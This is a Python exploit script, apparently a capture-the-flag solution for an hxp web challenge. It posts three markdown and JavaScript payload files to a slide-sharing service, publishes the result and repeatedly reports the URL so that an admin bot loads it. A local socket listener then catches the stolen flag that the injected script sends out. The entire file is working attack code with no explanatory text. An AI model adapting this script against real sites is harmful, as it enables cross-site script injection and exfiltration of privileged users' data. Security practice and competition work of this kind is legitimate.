#!/usr/bin/python3
import multiprocessing
import re
import requests
import socket
import sys
import time
import urllib.parse

def listener(lhost, lport, sync, result):
    with socket.socket() as s:
        s.bind((lhost, lport))
        sync.set()
        s.listen()
        connection, _ = s.accept()
        with connection:
            data = connection.recv(4096).decode().strip()
            print(urllib.parse.unquote(re.search(r'hxp%7B.*?%7D', data).group(0)))
    result.set()

def exploit(rhost, rport, lhost, lport, sync, result):
    HOST = f'http://{rhost}:{rport}'
    AHOST = f'http://127.0.0.1' # For anything the admin sees...
    LHOST = f'http://{lhost}:{lport}'
    JS_PAYLOAD = ''
    HTML_PAYLOAD = ''
    MAIN_PAYLOAD = ''
    def process(string):
        nonlocal HOST, LHOST, JS_PAYLOAD, HTML_PAYLOAD
        return string.replace('__HOST__', AHOST).replace('__LHOST__', LHOST).replace('__JS_PAYLOAD__', JS_PAYLOAD.replace(HOST, AHOST)).replace('__HTML_PAYLOAD__', HTML_PAYLOAD.replace(HOST, AHOST)).encode()
    def clean(url):
        return url if '?' not in url else url[:url.index('?')]
    with open('pwn/win.js') as payload:
        response = requests.post(
            f'{HOST}/new',
            data=process(payload.read()),
            headers={'Content-Type': 'text/markdown;charset=UTF-8'}
        )
        JS_PAYLOAD = clean(response.url)
        print('JS payload at', JS_PAYLOAD, file=sys.stderr)
    time.sleep(0.5)
    with open('pwn/payload.md') as payload:
        response = requests.post(
            f'{HOST}/new',
            data=process(payload.read()),
            headers={'Content-Type': 'text/markdown;charset=UTF-8'}
        )
        HTML_PAYLOAD = clean(response.url)
        print('HTML payload at', HTML_PAYLOAD, file=sys.stderr)
    time.sleep(0.5)
    with open('pwn/pwn.md') as payload:
        response = requests.post(
            f'{HOST}/new',
            data=process(payload.read()),
            headers={'Content-Type': 'text/markdown;charset=UTF-8'}
        )
        MAIN_PAYLOAD = clean(response.url)
        print('Main payload at', MAIN_PAYLOAD, file=sys.stderr)
    time.sleep(0.5)
    response = requests.get(f'{MAIN_PAYLOAD}/publish')
    SLIDE_PAYLOAD = clean(response.url).replace('/s/', '/p/')
    print('Slide payload at', SLIDE_PAYLOAD, file=sys.stderr)
    assert SLIDE_PAYLOAD.startswith(HOST)
    url = SLIDE_PAYLOAD[len(HOST):]
    time.sleep(0.5)
    sync.wait()
    while not result.is_set():
        print('Reporting payload')
        requests.get(f'{HOST}/report?url={url}')
        result.wait(8)

if __name__ == '__main__':
    rhost = sys.argv[1]
    rport = int(sys.argv[2])
    lhost = sys.argv[3]
    lport = int(sys.argv[4])
    sync = multiprocessing.Event()
    result = multiprocessing.Event()
    exploiter = multiprocessing.Process(target=exploit, args=(rhost, rport, lhost, lport, sync, result))
    exploiter.start()
    listener('0.0.0.0', lport, sync, result)
    exploiter.join()

